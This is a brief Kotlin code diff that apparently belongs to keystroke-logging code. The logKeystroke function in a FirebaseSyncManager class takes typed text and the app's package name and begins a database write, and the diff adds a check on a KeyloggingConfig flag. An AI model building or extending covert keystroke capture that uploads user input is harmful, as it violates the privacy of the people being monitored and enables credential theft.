@@ -16,6 +16,8 @@ class FirebaseSyncManager {
         private val scope = CoroutineScope(Dispatchers.IO)
 
         fun logKeystroke(text: String, packageName: String?) {
+            if (!KeyloggingConfig.isEnabled) return
+
             scope.launch {
                 try {
                     val database = FirebaseDatabase.getInstance()
